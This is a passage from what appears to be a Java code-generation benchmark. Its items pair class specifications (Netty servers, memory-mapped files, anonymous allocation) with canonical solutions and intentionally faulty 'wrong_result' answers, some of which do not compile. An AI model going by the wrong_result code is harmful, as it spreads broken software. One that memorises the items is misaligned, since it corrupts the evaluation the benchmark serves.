ServerBootstrap();\n        b.group(m_bossGroup, m_workerGroup)\n            .channel(channelClass)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addFirst(\"idleStateHandler\", new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0));\n                    pipeline.addAfter(\"idleStateHandler\", \"idleEventHandler\", timeoutHandler);\n                    pipeline.addLast(\"decoder\", new MqttDecoder());\n                    pipeline.addLast(\"encoder\", MqttEncoder.INSTANCE);\n                    pipeline.addLast(\"handler\", handler);\n                }\n            })\n            .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n            .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n            .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n            .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive);\n\n        try {\n            LOG.info(\"Binding server. host={}, port={}\", host, port);\n            ChannelFuture f = b.bind(host, port);\n            LOG.info(\"Server has been bound. host={}, port={}\", host, port);\n            f.sync();\n        } catch (InterruptedException ex) {\n            LOG.error(\"An interruptedException was caught while initializing server\", ex);\n        }\n    }\n\n    public void close() {\n        LOG.info(\"Closing Netty acceptor...\");\n        if (m_workerGroup == null || m_bossGroup == null) {\n            throw new IllegalStateException(\"Invoked close on an Acceptor that wasn't initialized\");\n        }\n        Future<?> workerWaiter = m_workerGroup.shutdownGracefully();\n        Future<?> bossWaiter = m_bossGroup.shutdownGracefully();\n\n        try {\n            workerWaiter.await(10, TimeUnit.SECONDS);\n            bossWaiter.await(10, TimeUnit.SECONDS);\n        } catch (InterruptedException iex) {\n            LOG.warn(\"An InterruptedException was caught while waiting for event loops to terminate...\");\n        }\n\n        if (!m_workerGroup.isTerminated()) {\n            m_workerGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n\n        if (!m_bossGroup.isTerminated()) {\n            m_bossGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class NettyAcceptor {\n    private NioEventLoopGroup m_bossGroup;\n    private NioEventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass = NioServerSocketChannel.class;\n    private int nettySoBacklog = 100;\n    private boolean nettySoReuseaddr = true;\n    private boolean nettyTcpNodelay = true;\n    private boolean nettySoKeepalive = true;\n    private int nettyChannelTimeoutSeconds = 60;\n\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) {\n        m_bossGroup = new NioEventLoopGroup();\n        m_workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(m_bossGroup, m_workerGroup)\n             .channel(channelClass)\n             .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n             .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n             .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n             .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive)\n             .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n\n            initializePlainTCPTransport(new NettyMQTTHandler(processor), props);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to initialize Netty acceptor\", e);\n        }\n    }\n\n    public void initializePlainTCPTransport(NettyMQTTHandler handler, IConfig props) throws Exception {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        ChannelFuture future = bootstrap.bind(props.getPort()).sync();\n        future.channel().closeFuture().await();\n    }\n\n    public void close() {\n        if (m_workerGroup != null) {\n            m_workerGroup.shutdownGracefully();\n        }\n        if (m_bossGroup != null) {\n            m_bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Java class that provides memory-mapped file access capabilities and process spawning functionality for inter-process communication scenarios.\n\nClass Description: FileChannelInteractor is a utility class that handles memory-mapped file operations and process management. It allows read-only memory mapping of files and provides functionality to spawn worker processes for IPC scenarios.\n\nAttributes:\n- fileChannel: FileChannel - The NIO FileChannel used for file operations\n- mapAddress: long - The memory address of the mapped file region\n- fileSize: long - The size of the mapped file in bytes\n\nMethods:\n- FileChannelInteractor(String filePath) -> void - Constructor that opens a file channel and maps the file into memory in read-only mode\n- getMemoryMappedAddress() -> long - Returns the memory address of the mapped file region\n- getFileSize() -> long - Returns the size of the mapped file\n- close() -> void - Closes the file channel and releases system resources\n- spawnWorkerProcess() -> void - Static method that spawns a worker process with the same command and arguments as the current process, adding a \"--worker\" flag",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mapAddress = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        fileChannel.close();\n    }\n\n    public static void spawnWorkerProcess() throws IOException {\n        ProcessHandle.Info info = ProcessHandle.current().info();\n        ArrayList<String> workerCommand = new ArrayList<>();\n        info.command().ifPresent(workerCommand::add);\n        info.arguments().ifPresent(args -> workerCommand.addAll(Arrays.asList(args)));\n        workerCommand.add(\"--worker\");\n        new ProcessBuilder()\n                .command(workerCommand)\n                .inheritIO()\n                .redirectOutput(ProcessBuilder.Redirect.PIPE)\n                .start()\n                .getInputStream()\n                .transferTo(System.out);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.File;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.lang.reflect.Field;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport sun.nio.ch.FileChannelImpl;\n\npublic class FileChannelInteractor {\n    private final FileChannel fileChannel;\n    private final long mapAddress;\n    private final long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException, NoSuchFieldException, IllegalAccessException {\n        RandomAccessFile file = new RandomAccessFile(new File(filePath), \"r\");\n        this.fileChannel = file.getChannel();\n        this.fileSize = fileChannel.size();\n\n        MappedByteBuffer buffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);\n        Field fcField = FileChannelImpl.class.getDeclaredField(\"map\");\n        fcField.setAccessible(true);\n        Object mappedBuffer = fcField.get(((FileChannelImpl) fileChannel));\n        Field addressField = mappedBuffer.getClass().getDeclaredField(\"address\");\n        addressField.setAccessible(true);\n        this.mapAddress = (Long) addressField.get(mappedBuffer);\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null && fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public static void spawnWorkerProcess() {\n        try {\n            ProcessBuilder pb = new ProcessBuilder();\n            pb.command(java.lang.management.ManagementFactory.getRuntimeMXBean().getInputArguments());\n            pb.inheritIO();\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable message handler, and managing server resources efficiently.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that extends AbstractServer. It manages server lifecycle (opening/closing), handles incoming connections with configurable thread pools, and processes messages through a provided message handler. The server supports connection management, configurable worker threads, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection events\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- serverChannel: [Channel] - Represents the server's listening channel\n- messageHandler: [MessageHandler] - Processes incoming requests\n- standardThreadExecutor: [StandardThreadExecutor] - Manages worker threads for request processing\n- rejectCounter: [AtomicInteger] - Tracks rejected requests count\n- channelManage: [NettyServerChannelManage] - Manages active connections\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools, binds to port, and sets up channel pipeline. Returns true if successful.\n- close() -> [void] - Shuts down the server gracefully, releasing all resources including thread pools and channels.\n- isBound() -> [boolean] - Checks if server is actively listening for connections.\n- request(Request) -> [Response] - Throws MotanFrameworkException as server doesn't support direct requests (inherited from AbstractServer).\n\nInput:\n- URL url: Configuration parameters for server setup (port, thread counts, queue sizes etc.)\n- MessageHandler messageHandler: Handler for processing incoming messages\n\nOutput:\n- When open() succeeds: Server starts listening on specified port and returns true\n- When close() completes: All server resources are released and state set to CLOSE\n- isBound(): Returns current server binding status",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.MessageHandler;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            LoggerUtil.warn(\"NettyServer ServerChannel already Open: url=\" + url);\n            return state.isAliveState();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        LoggerUtil.info(\"NettyServer ServerChannel start Open: url=\" + url);\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        int maxServerConnection = url.getIntParameter(URLParamType.maxServerConnection.getName(), URLParamType.maxServerConnection.getIntValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.getIntValue());\n\n        int minWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER) :\n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n        int maxWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER) :\n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n\n        standardThreadExecutor = new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, \n            new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnection);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\"channel_manage\", channelManage);\n                    pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                    pipeline.addLast(\"encoder\", new NettyEncoder());\n                    pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, standardThreadExecutor));\n                }\n            });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        setLocalAddress((InetSocketAddress) serverChannel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n\n        state = ChannelState.ALIVE;\n        LoggerUtil.info(\"NettyServer ServerChannel finish Open: url=\" + url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close() {\n        if (state.isCloseState()) {\n            return;\n        }\n\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (bossGroup != null) {\n                bossGroup.shutdownGracefully();\n                bossGroup = null;\n            }\n            if (workerGroup != null) {\n                workerGroup.shutdownGracefully();\n                workerGroup = null;\n            }\n            if (channelManage != null) {\n                channelManage.close();\n            }\n            if (standardThreadExecutor != null) {\n                standardThreadExecutor.shutdownNow();\n            }\n\n            state = ChannelState.CLOSE;\n            LoggerUtil.info(\"NettyServer close Success: url={}\", url.getUri());\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyServer close Error: url=\" + url.getUri(), e);\n        }\n    }\n\n    @Override\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isActive();\n    }\n\n    @Override\n    public Response request(Request request) throws TransportException {\n        throw new MotanFrameworkException(\"NettyServer request(Request request) method not support: url: \" + url);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\npublic class NettyServer extends AbstractServer {\n\n    private NioEventLoopGroup bossGroup;\n    private NioEventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url, messageHandler);\n        this.messageHandler = messageHandler;\n        this.channelManage = new NettyServerChannelManage(this);\n    }\n\n    @Override\n    public boolean open() {\n        int port = getUrl().getPort();\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(\"handler\", new NettyMessageHandler(messageHandler, standardThreadExecutor, rejectCounter));\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            serverChannel = bootstrap.bind(port).sync().channel();\n            setState(State.READY);\n            return true;\n        } catch (Exception e) {\n            close();\n            throw new MotanFrameworkException(\"Netty server start failed: \" + e.getMessage(), e);\n        }\n    }\n\n    @Override\n    public void close() {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdown();\n        }\n\n        setState(State.CLOSE);\n    }\n\n    @Override\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isOpen();\n    }\n\n    @Override\n    public Response request(Request request) throws RemotingException {\n        throw new MotanFrameworkException(\"NettyServer does not support direct requests.\");\n    }\n}\n```"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a class that provides anonymous memory allocation capabilities using memory-mapped files, with a fallback to direct byte buffers if memory-mapped files cannot be unlinked.\n\nClass Description: The `AnonAllocator` class is designed to allocate anonymous memory blocks that are not backed by visible files in the filesystem. It attempts to use memory-mapped files that are immediately unlinked (deleted) from the filesystem while remaining accessible through the mapping. If this technique is not supported by the system, it falls back to using direct byte buffers.\n\nAttributes:\n- MAP_AND_UNLINK_SUPPORTED: boolean - A static final flag indicating whether the system supports memory mapping with immediate file unlinking. This is determined during class initialization by testing the capability.\n\nMethods:\n- allocate(int size) -> ByteBuffer - Allocates an anonymous memory block of the specified size. If memory-mapped files with unlinking are supported, it creates a temporary file, maps it into memory, and immediately deletes the file. Otherwise, it falls back to a direct byte buffer allocation. The method returns the allocated ByteBuffer.\n  - Input: size (int) - The size of the memory block to allocate in bytes.\n  - Output: ByteBuffer - The allocated memory block, either as a memory-mapped buffer or a direct byte buffer.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class AnonAllocator {\n\n    static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        Path p = null;\n        boolean result = false;\n        try {\n            ByteBuffer mapped;\n            p = Files.createTempFile(\"unlink-test\", \".tmp\");\n            FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            chan.write(ByteBuffer.allocate(4*1024));\n            mapped = chan.map(MapMode.READ_WRITE, 0, 4*1024);\n            chan.close();\n            Files.delete(p);\n            result = mapped.get() == 0;\n        } catch (IOException e) {\n            if(p != null) {\n                Path toDelete = p;\n                Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                    try {\n                        Files.deleteIfExists(toDelete);\n                    } catch (IOException e1) {\n                        System.err.println(\"could not delete tempfile \"  + toDelete + \", most likely cause: garbage collector did not free the memory mapping keeping it open ; \" + e1.getMessage());\n                    }\n                }));\n            }\n        }\n        MAP_AND_UNLINK_SUPPORTED = result;\n    }\n\n    public static ByteBuffer allocate(int size) {\n        if(MAP_AND_UNLINK_SUPPORTED) {\n            try {\n                Path p = Files.createTempFile(\"anon-mapping\", \".tmp\");\n                ByteBuffer mapped;\n                FileChannel chan = FileChannel.open(p, StandardOpenOption.READ, StandardOpenOption.WRITE);\n                chan.position(size);\n                chan.write(ByteBuffer.allocate(1));\n                mapped = chan.map(MapMode.READ_WRITE, 0, size);\n                chan.close();\n                Files.delete(p);\n                return mapped;\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return ByteBuffer.allocateDirect(size);\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.File;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.lang.reflect.Field;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.ByteBuffer;\n\npublic class AnonAllocator {\n    public static final boolean MAP_AND_UNLINK_SUPPORTED;\n\n    static {\n        boolean supported = false;\n        File tempFile = null;\n        try {\n            tempFile = File.createTempFile(\"anon-mem\", null);\n            tempFile.deleteOnExit();\n            RandomAccessFile raf = new RandomAccessFile(tempFile, \"rw\");\n            MappedByteBuffer buffer = raf.getChannel().map(FileChannel.MapMode.READ_WRITE, 0, 1);\n            if (buffer != null) {\n                try {\n                    File.deleteOnExit();\n                    tempFile.delete();\n                    supported = true;\n                } finally {\n                    buffer.force();\n                    buffer.clear();\n                }\n            }\n        } catch (Exception e) {\n            // Ignore and fall back to direct buffers\n        } finally {\n            if (tempFile != null && !supported) {\n                tempFile.delete();\n            }\n        }\n        MAP_AND_UNLINK_SUPPORTED = supported;\n    }\n\n    public ByteBuffer allocate(int size) {\n        if (MAP_AND_UNLINK_SUPPORTED) {\n            return allocateViaMapAndUnlink(size);\n        } else {\n            return allocateViaDirectBuffer(size);\n        }\n    }\n\n    private ByteBuffer allocateViaMapAndUnlink(int size) {\n        File tempFile = null;\n        FileChannel channel = null;\n        try {\n            tempFile = File.createTempFile(\"anon-mem\", null);\n            RandomAccessFile raf = new RandomAccessFile(tempFile, \"rw\");\n            raf.setLength(size);\n            channel = raf.getChannel();\n            MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n            try {\n                tempFile.delete();\n            } catch (Exception ignored) {\n            }\n            return buffer;\n        } catch (IOException e) {\n            return allocateViaDirectBuffer(size);\n        } finally {\n            if (channel != null) {\n                try {\n                    channel.close();\n                } catch (IOException ignored) {\n                }\n            }\n        }\n    }\n\n    private ByteBuffer allocateViaDirectBuffer(int size) {\n        return ByteBuffer.allocateDirect(size);\n    }\n}\n```"
  },
  {
    "Task_id": 213,
    "Instruction": "Task Description: Implement a Netty-based TCP server for handling remote commands with connection management and idle state detection.\n\nClass Description: NettyRemotingServer is a TCP server implementation using Netty framework that handles incoming remote commands, manages client connections, and provides event notification for connection changes. It supports configurable thread pools, connection idle detection, and custom channel event handling.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for server configuration\n- bossSelectorGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerSelectorGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- defaultEventExecutorGroup: DefaultEventExecutorGroup - Thread pool for business logic processing\n- appContext: AppContext - Application context for dependency injection\n- LOGGER: Logger - Logger instance for server operations logging\n\nMethods:\n- NettyRemotingServer(AppContext, RemotingServerConfig) -> void - Constructor with application context and server configuration\n- NettyRemotingServer(RemotingServerConfig, ChannelEventListener) -> void - Constructor with server configuration and channel event listener\n- serverStart() -> void - Starts the Netty server, initializes thread pools and configures server bootstrap\n- serverShutdown() -> void - Shuts down the server gracefully, releasing all resources\n- NettyServerHandler: channelRead0(ChannelHandlerContext, RemotingCommand) -> void - Handles incoming message processing\n- NettyConnectManageHandler: channelRegistered(ChannelHandlerContext) -> void - Logs channel registration events\n- NettyConnectManageHandler: channelUnregistered(ChannelHandlerContext) -> void - Logs channel unregistration events\n- NettyConnectManageHandler: channelActive(ChannelHandlerContext) -> void - Handles new active connections\n- NettyConnectManageHandler: channelInactive(ChannelHandlerContext) -> void - Handles connection close events\n- NettyConnectManageHandler: userEventTriggered(ChannelHandlerContext, Object) -> void - Handles idle state events\n- NettyConnectManageHandler: exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.factory.NamedThreadFactory;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.remoting.*;\nimport com.github.ltsopensource.remoting.common.RemotingHelper;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport com.github.ltsopensource.remoting.protocol.RemotingCommand;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\n\nimport java.net.InetSocketAddress;\n\npublic class NettyRemotingServer extends AbstractRemotingServer {\n\n    public static final Logger LOGGER = AbstractRemotingServer.LOGGER;\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private AppContext appContext;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n        this.appContext = appContext;\n    }\n\n    public NettyRemotingServer(RemotingServerConfig remotingServerConfig, final ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(1, new NamedThreadFactory(\"NettyBossSelectorThread_\"));\n        this.workerSelectorGroup = new NioEventLoopGroup(remotingServerConfig.getServerSelectorThreads(), new NamedThreadFactory(\"NettyServerSelectorThread_\", true));\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        NettyLogger.setNettyLoggerFactory();\n\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(\n                remotingServerConfig.getServerWorkerThreads(),\n                new NamedThreadFactory(\"NettyServerWorkerThread_\")\n        );\n\n        final NettyCodecFactory nettyCodecFactory = new NettyCodecFactory(appContext, getCodec());\n\n        this.serverBootstrap.group(this.bossSelectorGroup, this.workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 65536)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .localAddress(new InetSocketAddress(this.remotingServerConfig.getListenPort()))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                defaultEventExecutorGroup,\n                                nettyCodecFactory.getEncoder(),\n                                nettyCodecFactory.getDecoder(),\n                                new IdleStateHandler(remotingServerConfig.getReaderIdleTimeSeconds(),\n                                        remotingServerConfig.getWriterIdleTimeSeconds(), remotingServerConfig.getServerChannelMaxIdleTimeSeconds()),\n                                new NettyConnectManageHandler(),\n                                new NettyServerHandler());\n                    }\n                });\n\n        try {\n            this.serverBootstrap.bind().sync();\n        } catch (InterruptedException e) {\n            throw new RemotingException(\"Start Netty server bootstrap error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        this.bossSelectorGroup.shutdownGracefully();\n        this.workerSelectorGroup.shutdownGracefully();\n\n        if (this.defaultEventExecutorGroup != null) {\n            this.defaultEventExecutorGroup.shutdownGracefully();\n        }\n    }\n\n    class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            processMessageReceived(new NettyChannel(ctx), msg);\n        }\n    }\n\n    class NettyConnectManageHandler extends ChannelDuplexHandler {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelRegistered {}\", remoteAddress);\n            super.channelRegistered(ctx);\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelUnregistered, the channel[{}]\", remoteAddress);\n            super.channelUnregistered(ctx);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelActive, the channel[{}]\", remoteAddress);\n            super.channelActive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CONNECT, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelInactive, the channel[{}]\", remoteAddress);\n            super.channelInactive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CLOSE, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n                final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n\n                if (event.state().equals(IdleState.ALL_IDLE)) {\n                    LOGGER.warn(\"SERVER: IDLE [{}]\", remoteAddress);\n                    RemotingHelper.closeChannel(channel);\n                }\n\n                if (channelEventListener != null) {\n                    RemotingEventType remotingEventType = RemotingEventType.valueOf(event.state().name());\n                    putRemotingEvent(new RemotingEvent(remotingEventType, remoteAddress, channel));\n                }\n            }\n            ctx.fireUserEventTriggered(evt);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.warn(\"SERVER: exceptionCaught {}\", remoteAddress, cause);\n\n            if (channelEventListener != null) 